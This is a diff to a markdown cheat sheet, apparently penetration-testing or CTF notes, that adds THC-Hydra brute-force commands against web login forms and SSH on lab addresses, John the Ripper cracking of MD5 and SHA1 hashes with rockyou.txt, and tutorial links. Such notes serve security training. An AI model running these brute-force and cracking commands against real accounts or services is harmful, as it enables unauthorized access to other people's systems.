@@ -2,7 +2,8 @@
 
 * **THC-Hydra**
 
-        $ hydra -l username -P password_file.txt -s port -f ip_address request_method /path
+        $ hydra -l <USER> -p <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
+        $ hydra -l admin -P /usr/share/wordlists/rockyou.txt domain.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
         $ hydra -L tomcat_username.lst -P /home/kali/Documents/lab/wordlist/rockyou.txt -s 8080 -f 10.10.10.4 http-get /manager/html
         $ hydra -l john -P rockyou.txt -t 6 ssh://10.10.10.NNN
 
@@ -33,13 +34,15 @@
 
 ### **Password Hash** 
 
-1. Create `password.txt` file in following format
+1. Identify the hash using [hash-identifier](https://tools.kali.org/password-attacks/hash-identifier)
+2. Create `hash.txt` file in following format
 
         username:MD5HASHVALUEHERE
 
-2. Crack the hash using [john](https://www.openwall.com/john/)
+3. Crack the hash using [john](https://www.openwall.com/john/)
 
-        john password.txt --format=raw-md5 --wordlist=rockyou.txt --rules
+        $ john hash.txt --format=raw-md5 --wordlist=rockyou.txt --rules
+        $ sudo john hash.txt -format=raw-sha1 --wordlist=rockyou.txt --rules
 
 ### Cracking Linux Account Passwords from /etc/passwd and /etc/shadow
 
@@ -74,3 +77,6 @@
 * http://manpages.ubuntu.com/manpages/bionic/man8/unshadow.8.html
 * https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/
 * http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
+* https://linuxhint.com/crack-web-based-login-page-with-hydra-in-kali-linux/
+* https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
+* https://unicornsec.com/home/tryhackme-crack-the-hash
